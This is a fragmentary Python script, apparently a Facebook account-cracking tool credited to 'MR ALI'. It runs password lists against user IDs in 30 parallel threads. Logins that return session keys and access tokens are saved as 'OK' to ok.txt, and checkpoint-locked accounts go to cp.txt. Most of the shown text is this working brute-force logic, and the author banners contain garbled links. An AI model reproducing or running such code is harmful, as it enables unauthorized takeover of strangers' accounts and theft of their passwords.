...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m MR ALI\x1b[0m\x1b[1;97m]
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   :MR ALI \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : www.gitclone//github.com/ALI AHMED-xd \x1b[0m\x1b[1;97m]

\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./ALI AHMED-xd \x1b[0m\x1b[1;97m]
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Simpelgithub/aproval.txt/blob/main/aprooval.txt"])
...
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   : ALI AHMED \x1b[0m\x1b[1;97m]
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("\033[0;92m[=Ã—>]\033[0;92m NOTE : BEFORE LOGIN CP IDZ ")
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;97m   [=ALI=OK=>] %s | %s\033[0;97m         "%(uid, pw))

				self.ok.append("%s|%s"%(uid, pw))

				open("ok.txt","a").write("   [=ALI=OK=>]  %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;92m   [=ALI=CP=>] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write("   [=ALI=CP=>]  %s|%s\n"%(uid, pw))
